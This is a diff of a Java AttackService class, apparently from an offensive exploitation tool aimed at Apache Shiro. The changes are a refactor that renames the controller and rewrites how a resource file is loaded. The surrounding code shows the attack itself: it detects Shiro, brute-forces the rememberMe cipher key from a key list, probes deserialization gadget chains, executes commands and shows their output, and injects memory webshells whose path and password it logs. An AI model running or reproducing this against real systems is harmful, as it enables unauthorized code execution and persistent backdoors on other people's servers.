@@ -10,13 +10,12 @@ import com.liev.clouds.utils.shiroutils.Gadgets;
 import com.liev.clouds.payload.shiro.util.HttpUtil;
 import com.liev.clouds.utils.shiroutils.Shiro;
 import com.liev.clouds.payload.shiro.util.Utils;
-import com.liev.clouds.webcontroller.middleware.MainController;
+import com.liev.clouds.webcontroller.middleware.ShiroController;
 import javafx.collections.ObservableList;
 import org.apache.shiro.codec.Base64;
 
 import java.io.*;
 import java.net.Proxy;
-import java.net.URL;
 import java.nio.charset.StandardCharsets;
 import java.security.SecureRandom;
 import java.util.*;
@@ -37,7 +36,7 @@ public class AttackService {
     public static String realShiroKey = null;
     public static Map<String, String> globalHeader = null;
     public static String postData = null;
-    private final MainController mainController;
+    private final ShiroController shiroController;
     public int flagCount = 0;
 
     private static ProxyConfig proxyConfig = new ProxyConfig();
@@ -51,7 +50,7 @@ public class AttackService {
     }
 
     public AttackService(String method, String url, String shiroKeyWord, String timeout, Map<String, String> globalHeader, String postData) {
-        this.mainController = (MainController) ControllersFactory.controllers.get(MainController.class.getSimpleName());
+        this.shiroController = (ShiroController) ControllersFactory.controllers.get(ShiroController.class.getSimpleName());
         this.url = url;
         this.method = method;
         this.timeout = Integer.parseInt(timeout) * 1000;
@@ -101,7 +100,7 @@ public class AttackService {
 
             }
         } catch (Exception var5) {
-            this.mainController.log.appendText(Utils.log(var5.getMessage()));
+            this.shiroController.log.appendText(Utils.log(var5.getMessage()));
         }
 
 
@@ -124,7 +123,7 @@ public class AttackService {
                 result = HttpUtil.postHttpReuest(this.url, postString, "UTF-8", combineHeaders, "application/x-www-form-urlencoded", this.timeout);
             }
         } catch (Exception var6) {
-            this.mainController.log.appendText(Utils.log(var6.getMessage()));
+            this.shiroController.log.appendText(Utils.log(var6.getMessage()));
         }
 
         return result;
@@ -134,12 +133,12 @@ public class AttackService {
         ArrayList<String> shiroKeys = new ArrayList<>();
 
         try {
-            URL resource = getClass().getClassLoader().getResource("data/shiro_keys.txt");
-            if (resource == null) {
+            InputStream inputStream = getClass().getClassLoader().getResourceAsStream("data/shiro_keys.txt");
+            if (inputStream == null) {
                 throw new FileNotFoundException("Shiro keys file not found in resources");
             }
-            File shiro_file = new File(resource.toURI());
-            BufferedReader br = new BufferedReader(new InputStreamReader(new FileInputStream(shiro_file), StandardCharsets.UTF_8));
+
+            BufferedReader br = new BufferedReader(new InputStreamReader(inputStream, StandardCharsets.UTF_8));
 
             String line;
             while ((line = br.readLine()) != null) {
@@ -180,19 +179,19 @@ public class AttackService {
 //                header.put("Host", "08fb41620aa4c498a1f2ef09bbc1183c");
                 String result = this.headerHttpRequest(header);
                 if (result.contains("Host")) {
-                    this.mainController.log.appendText(Utils.log("[++] 发现构造链:" + gadgetOpt + "  回显方式: " + echoOpt));
-                    this.mainController.log.appendText(Utils.log("[++] 请尝试进行功能区利用。"));
-                    this.mainController.utilizeChain.setValue(gadgetOpt);
-                    this.mainController.echoWay.setValue(echoOpt);
+                    this.shiroController.log.appendText(Utils.log("[++] 发现构造链:" + gadgetOpt + "  回显方式: " + echoOpt));
+                    this.shiroController.log.appendText(Utils.log("[++] 请尝试进行功能区利用。"));
+                    this.shiroController.utilizeChain.setValue(gadgetOpt);
+                    this.shiroController.echoWay.setValue(echoOpt);
                     gadget = gadgetOpt;
                     attackRememberMe = rememberMe;
                     flag = true;
                 } else {
-                    this.mainController.log.appendText(Utils.log("[-] 测试:" + gadgetOpt + "  回显方式: " + echoOpt));
+                    this.shiroController.log.appendText(Utils.log("[-] 测试:" + gadgetOpt + "  回显方式: " + echoOpt));
                 }
             }
         } catch (Exception var8) {
-            this.mainController.log.appendText(Utils.log(var8.getMessage()));
+            this.shiroController.log.appendText(Utils.log(var8.getMessage()));
         }
 
         return flag;
@@ -209,7 +208,7 @@ public class AttackService {
             rememberMe = shiro.sendpayload(chainObject, this.shiroKeyWord, spcShiroKey);
         } catch (Exception var9) {
             var9.printStackTrace();
-            this.mainController.log.appendText(Utils.log(var9.getMessage()));
+            this.shiroController.log.appendText(Utils.log(var9.getMessage()));
         }
 
         return rememberMe;
@@ -226,7 +225,7 @@ public class AttackService {
                 this.keyTestTask2(tempList);}
 
         } catch (Exception var3) {
-            this.mainController.log.appendText(Utils.log(var3.getMessage()));
+            this.shiroController.log.appendText(Utils.log(var3.getMessage()));
         }
 
     }
@@ -235,18 +234,18 @@ public class AttackService {
         try {
             List<String> shiroKeys = this.getALLShiroKeys();
             if (shiroKeys == null || shiroKeys.isEmpty()) {
-                this.mainController.log.appendText(Utils.log("Shiro keys not found or file is empty."));
+                this.shiroController.log.appendText(Utils.log("Shiro keys not found or file is empty."));
                 return;
             }
             if (flagCount == 1) {
                 this.keyTestTask(shiroKeys);
             } else {
                 this.keyTestTask2(shiroKeys);
-                this.mainController.log.appendText(Utils.log("[++] 含有多个shiro场景"));
+                this.shiroController.log.appendText(Utils.log("[++] 含有多个shiro场景"));
             }
         } catch (Exception var2) {
-            if (this.mainController != null && this.mainController.log != null) {
-                this.mainController.log.appendText(Utils.log(var2.getMessage()));
+            if (this.shiroController != null && this.shiroController.log != null) {
+                this.shiroController.log.appendText(Utils.log(var2.getMessage()));
             } else {
                 var2.printStackTrace(); // 使用标准输出打印异常信息，避免丢失日志
             }
@@ -269,7 +268,7 @@ public class AttackService {
 //                flag = true;
 //            }
             if (flag) {
-                this.mainController.log.appendText(Utils.log("[++] 存在shiro框架！"));
+                this.shiroController.log.appendText(Utils.log("[++] 存在shiro框架！"));
                 flag = true;
                 flagCount = countDeleteMe(result);
 
@@ -285,19 +284,19 @@ public class AttackService {
 //                    flag = true;
 //                }
                 if(flag){
-                    this.mainController.log.appendText(Utils.log("[++] 存在shiro框架！"));
+                    this.shiroController.log.appendText(Utils.log("[++] 存在shiro框架！"));
                     flag = true;
                     flagCount = countDeleteMe(result);
 
                 }else {
 
-                    this.mainController.log.appendText(Utils.log("[-] 未发现shiro框架！"));
+                    this.shiroController.log.appendText(Utils.log("[-] 未发现shiro框架！"));
 
                 }
             }
         } catch (Exception var4) {
             if (var4.getMessage() != null) {
-                this.mainController.log.appendText(Utils.log(var4.getMessage()));
+                this.shiroController.log.appendText(Utils.log(var4.getMessage()));
             }
         }
 
@@ -342,19 +341,19 @@ public class AttackService {
                             String result = AttackService.this.headerHttpRequest(header);
                             Thread.sleep(100L);
                             if (result!=null &&!result.isEmpty()&&!result.contains("=deleteMe")) {
-                                AttackService.this.mainController.log.appendText(Utils.log("[++] 找到key：" + shirokey));
-                                AttackService.this.mainController.specifyKey.setText(shirokey);
+                                AttackService.this.shiroController.log.appendText(Utils.log("[++] 找到key：" + shirokey));
+                                AttackService.this.shiroController.specifyKey.setText(shirokey);
                                 AttackService.realShiroKey = shirokey;
                                 break;
                             }
 
-                            AttackService.this.mainController.log.appendText(Utils.log("[-] " + shirokey));
+                            AttackService.this.shiroController.log.appendText(Utils.log("[-] " + shirokey));
                         } catch (Exception var6) {
-                            AttackService.this.mainController.log.appendText(Utils.log("[-] " + shirokey + " " + var6.getMessage()));
+                            AttackService.this.shiroController.log.appendText(Utils.log("[-] " + shirokey + " " + var6.getMessage()));
                         }
 
                     }
-                    AttackService.this.mainController.log.appendText(Utils.log("[+] 爆破结束"));
+                    AttackService.this.shiroController.log.appendText(Utils.log("[+] 爆破结束"));
 
                 } catch (Exception var7) {
                     throw var7;
@@ -378,19 +377,19 @@ public class AttackService {
                             String result = AttackService.this.headerHttpRequest(header);
                             Thread.sleep(100L);
                             if (result!=null &&!result.isEmpty()&&countDeleteMe(result)<flagCount) {
-                                AttackService.this.mainController.log.appendText(Utils.log("[++] 找到key：" + shirokey));
-                                AttackService.this.mainController.specifyKey.setText(shirokey);
+                                AttackService.this.shiroController.log.appendText(Utils.log("[++] 找到key：" + shirokey));
+                                AttackService.this.shiroController.specifyKey.setText(shirokey);
                                 AttackService.realShiroKey = shirokey;
                                 break;
                             }
 
-                            AttackService.this.mainController.log.appendText(Utils.log("[-] " + shirokey));
+                            AttackService.this.shiroController.log.appendText(Utils.log("[-] " + shirokey));
                         } catch (Exception var6) {
-                            AttackService.this.mainController.log.appendText(Utils.log("[-] " + shirokey + " " + var6.getMessage()));
+                            AttackService.this.shiroController.log.appendText(Utils.log("[-] " + shirokey + " " + var6.getMessage()));
                         }
 
                     }
-                    AttackService.this.mainController.log.appendText(Utils.log("[+] 爆破结束"));
+                    AttackService.this.shiroController.log.appendText(Utils.log("[+] 爆破结束"));
 
                 } catch (Exception var7) {
                     throw var7;
@@ -411,13 +410,13 @@ public class AttackService {
 
             try {
                 String defaultEncode = Utils.guessEncoding(b64bytes);
-                this.mainController.executionResults.appendText(new String(b64bytes, defaultEncode));
-                this.mainController.executionResults.appendText("-----------------------------------------------------------------------"+ "\n");
+                this.shiroController.executionResults.appendText(new String(b64bytes, defaultEncode));
+                this.shiroController.executionResults.appendText("-----------------------------------------------------------------------"+ "\n");
             } catch (UnsupportedEncodingException var8) {
-                this.mainController.executionResults.appendText(new String(b64bytes) + "\n");
+                this.shiroController.executionResults.appendText(new String(b64bytes) + "\n");
             }
         } else {
-            this.mainController.executionResults.appendText(Utils.log("命令已执行,返回为空"));
+            this.shiroController.executionResults.appendText(Utils.log("命令已执行,返回为空"));
         }
 
     }
@@ -436,23 +435,23 @@ public class AttackService {
                 String result = this.bodyHttpRequest(header, postString);
                 if (result.contains("->|Success|<-")) {
                     String httpAddress = Utils.UrlToDomain(this.url);
-                    this.mainController.shellLog.appendText(Utils.log(memShellType + "  注入成功!"));
-                    this.mainController.shellLog.appendText(Utils.log("路径：" + httpAddress + shellPath));
+                    this.shiroController.shellLog.appendText(Utils.log(memShellType + "  注入成功!"));
+                    this.shiroController.shellLog.appendText(Utils.log("路径：" + httpAddress + shellPath));
                     if (!memShellType.equals("reGeorg[Servlet]")) {
-                        this.mainController.shellLog.appendText(Utils.log("密码：" + shellPass));
+                        this.shiroController.shellLog.appendText(Utils.log("密码：" + shellPass));
                     }
                 } else {
                     if (result.contains("->|") && result.contains("|<-")) {
-                        this.mainController.shellLog.appendText(Utils.log(result));
+                        this.shiroController.shellLog.appendText(Utils.log(result));
                     }
 
-                    this.mainController.shellLog.appendText(Utils.log("注入失败,请更换注入类型或者更换新路径"));
+                    this.shiroController.shellLog.appendText(Utils.log("注入失败,请更换注入类型或者更换新路径"));
                 }
             } catch (Exception var10) {
-                this.mainController.shellLog.appendText(Utils.log(var10.getMessage()));
+                this.shiroController.shellLog.appendText(Utils.log(var10.getMessage()));
             }
 
-            this.mainController.shellLog.appendText(Utils.log("-------------------------------------------------"));
+            this.shiroController.shellLog.appendText(Utils.log("-------------------------------------------------"));
         }
 
     }
